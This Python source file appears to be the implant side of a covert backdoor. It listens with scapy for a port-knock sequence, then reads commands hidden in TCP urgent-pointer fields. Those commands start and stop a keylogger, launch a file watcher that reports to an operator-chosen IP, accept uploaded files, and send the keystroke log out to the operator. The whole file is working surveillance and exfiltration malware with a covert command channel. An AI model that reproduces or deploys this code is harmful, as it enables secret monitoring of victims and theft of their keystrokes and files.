from scapy.all import sniff, TCP, IP, send
import base64
from scapy.layers.inet import IP
import os
import time
import subprocess
import threading
import socket
import requests  # Add this import for sending HTTP requests


def get_local_ip():
    """Get the local IP address of the machine."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connect to an external IP to get the local IP address
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = "127.0.0.1"
    finally:
        s.close()
    return local_ip

# Configuration variables
dest_ip = input("Enter the destination IP for sending packets: ")
local_ip = get_local_ip()
source_port = 80
dest_port = 80
received_data = ""
eof_signal = 65535
keylogger_start_signal = 1
keylogger_stop_signal = 2
file_transfer_signal = 3
watcher_start_signal = 4
watcher_stop_signal = 5
current_signal = None
signal_received = False
keylogger_process = None
watcher_process = None
knock_sequence = [3434, 4545, 5656] 
knock_index = 0
communication_port = 80
ack_event = threading.Event()
timeout = 10  # Timeout in seconds for acknowledgment
knock_ip = None
received_chunks = 0
chunk_timeout = 5  # Timeout in seconds for receiving the next chunk
chunk_timer = None

def send_acknowledgment(ip, port):
    """Send a TCP acknowledgment packet back to the original sender."""
    ip_layer = IP(dst=ip)
    # Change flags from "A" to "SA" and use sport=80 to match expected port
    tcp_layer = TCP(sport=80, dport=port, flags="SA")/b"ACK"
    ack_packet = ip_layer/tcp_layer
    send(ack_packet)
    print(f"Sent acknowledgment to {ip}:{port}")

def packet_callback(packet):
    """Callback function to process each sniffed packet."""
    global current_signal, received_data, signal_received, knock_index, knock_ip
    if packet.haslayer(TCP):
        src_ip = packet[IP].src
        src_port = packet[TCP].sport
        dport = packet[TCP].dport

        if knock_index == 0 and dport == knock_sequence[0]:
            knock_ip = src_ip
            knock_index += 1
            print(f"First port knock detected.")
        elif knock_index > 0 and src_ip == knock_ip:
            if dport in knock_sequence[1:]:
                knock_index += 1
                if knock_index == len(knock_sequence):
                    print("Port-knocking sequence completed. Sending acknowledgment.")
                    send_acknowledgment(knock_ip, src_port)
                    open_communication_port()
                    knock_index = 0
                    wait_for_signal()

def wait_for_signal():
    """Wait for a signal after port-knocking sequence."""
    print("Waiting for signal...")
    sniff_thread = threading.Thread(target=sniff, kwargs={'filter': f"tcp and dst host {local_ip}", 'prn': signal_callback, 'store': 0})
    sniff_thread.start()

def reset_chunk_timer():
    global chunk_timer
    if chunk_timer:
        chunk_timer.cancel()
    chunk_timer = threading.Timer(chunk_timeout, handle_chunk_timeout)
    chunk_timer.start()

def handle_chunk_timeout():
    global received_data, received_chunks
    print("Timeout: Did not receive the next chunk in time.")
    received_data = ""
    received_chunks = 0
    reset_state()
    wait_for_port_knocking()

def signal_callback(packet):
    """Callback function to process each sniffed packet for signals."""
    global current_signal, received_data, signal_received, received_chunks, chunk_timer
    if packet.haslayer(TCP) and packet[TCP].flags == "PAU":
        urgent_pointer_value = packet[TCP].urgptr

        # Check for initial signal
        if current_signal is None or current_signal == 0:
            if urgent_pointer_value in [keylogger_start_signal, keylogger_stop_signal, file_transfer_signal, watcher_start_signal, watcher_stop_signal]:
                current_signal = urgent_pointer_value
                received_chunks = 0
                signal_received = True
                print(f"Initial Signal Received: {current_signal}")
                handle_initial_signal()
                reset_chunk_timer()
                return

        # Decode the urgent pointer value as 2-byte chunks
        chunk = urgent_pointer_value.to_bytes(2, 'big')
        received_data += chunk.decode('utf-8', errors='ignore')
        received_chunks += 1
        print(f"Received chunk #{received_chunks}: {urgent_pointer_value}")
        print(f"Current data: {received_data}")

        if urgent_pointer_value == eof_signal:
            print(f"EOF marker detected. Total chunks received: {received_chunks}")
            try:
                data_to_process = received_data[:-2]
                # Add padding if necessary
                padding_needed = len(data_to_process) % 4
                if padding_needed:
                    data_to_process += "=" * (4 - padding_needed)
                
                decoded_bytes = base64.b64decode(data_to_process)
                
                if current_signal == file_transfer_signal:
                    try:
                        decoded_str = decoded_bytes.decode('utf-8')
                        if '|' in decoded_str:
                            decoded_str = decoded_str.rstrip('/')
                            file_name, file_content = decoded_str.split('|', 1)
                            save_to_file(file_name.strip(), file_content.encode())
                        else:
                            print("Error: Missing file separator")
                    except UnicodeDecodeError:
                        print("Error: Invalid UTF-8 in file data")
                else:
                    handle_data(decoded_bytes)
                
            except base64.binascii.Error as e:
                print(f"Base64 decoding error: {e}")
                print(f"Problematic data: {data_to_process}")
            except Exception as e:
                print(f"Error processing data: {e}")
            
            reset_state()
            wait_for_port_knocking()
            # Stop the chunk timer
            if chunk_timer:
                chunk_timer.cancel()
        else:
            reset_chunk_timer()

def handle_initial_signal():
    """Handle the initial signal received."""
    global current_signal
    if current_signal == keylogger_start_signal:
        print("Start keylogger signal received.")
        start_keylogger()
    elif current_signal == keylogger_stop_signal:
        print("Stop keylogger signal received.")
        stop_keylogger()
    elif current_signal == file_transfer_signal:
        print("File transfer signal received.")
    elif current_signal == watcher_stop_signal:
        print("Stop watcher signal received.")
        stop_watcher()

def start_keylogger():
    """Start the keylogger process."""
    global keylogger_process
    script_dir = os.path.abspath('.')  # Changed from os.path.dirname(os.path.abspath(__file__))
    keylogger_process = subprocess.Popen(['python3', os.path.join(script_dir, 'logger.py')])
    reset_state()
    wait_for_port_knocking()

def stop_keylogger():
    """Stop the keylogger process and send the log file."""
    global keylogger_process
    if keylogger_process:
        keylogger_process.terminate()
        keylogger_process = None
    time.sleep(3)
    send_log_file()
    print("Keylogger stopped and log file sent.")
    reset_state()
    wait_for_port_knocking()

def start_watcher(file_path):
    """Start the watcher process."""
    global watcher_process
    script_dir = os.path.abspath('.')  # Changed from os.path.dirname(os.path.abspath(__file__))
    watcher_process = subprocess.Popen(['python3', os.path.join(script_dir, 'watcher.py'), file_path, dest_ip])
    reset_state()
    wait_for_port_knocking()

def stop_watcher():
    """Stop the watcher process."""
    global watcher_process
    if watcher_process:
        watcher_process.terminate()
        watcher_process = None
    reset_state()
    wait_for_port_knocking()

def send_log_file():
    """Send the log file using the encoder script."""
    log_file_path = os.path.join(os.getcwd(), "log.txt")
    if os.path.isfile(log_file_path):
        os.system(f'python3 encoder.py FT:{dest_ip} "{log_file_path}"')
    else:
        print("Log file not found.")

def handle_data(decoded_data):
    """Handle the received data based on the current signal."""
    global current_signal
    if current_signal == file_transfer_signal:
        save_file(decoded_data)
    elif current_signal == watcher_start_signal:
        watcher_command = decoded_data.decode(errors='ignore')
        print(f"Watcher command received: {watcher_command}")
        start_watcher(watcher_command)
    reset_state()

def save_file(decoded_data):
    """Save the file from the decoded data."""
    try:
        # Get the metadata portion as text, but keep content as raw bytes
        metadata = decoded_data[:decoded_data.index(b'|')].decode('utf-8')
        # Get the raw content after the first | character
        file_content = decoded_data[decoded_data.index(b'|')+1:]
        
        if not metadata:
            print("Error: No filename provided")
            return

        file_name = metadata.strip()
        save_to_file(file_name, file_content)
    except Exception as e:
        print(f"Error saving file: {e}")

def save_to_file(file_name, content):
    """Save the content to a file."""
    # Get just the filename without the full path for security
    safe_filename = os.path.basename(file_name)
    with open(os.path.join(os.getcwd(), safe_filename), 'wb') as file:
        file.write(content)
    print(f"File {safe_filename} created successfully.")

def reset_state():
    """Reset the state variables."""
    global current_signal, received_data, signal_received, received_chunks
    received_data = ""
    current_signal = 0
    signal_received = False
    received_chunks = 0
    # close the sniffing thread if it's running
    sniff_thread = threading.active_count()
    if sniff_thread > 0:
        sniff_thread.join(timeout=1)
    print("State reset.")

def open_communication_port():
    """Open the designated communication port."""
    global communication_port
    print(f"Communication port {communication_port} opened.")

def wait_for_port_knocking():
    """Wait for the port-knocking sequence."""
    print("Waiting for port-knocking sequence...")
    sniff_thread = threading.Thread(target=sniff, kwargs={'filter': f"tcp and dst host {local_ip}", 'prn': packet_callback, 'store': 0})
    sniff_thread.start()

def run_async_task(task):
    """Run a task asynchronously."""
    threading.Thread(target=task).start()

if __name__ == "__main__":
    wait_for_port_knocking()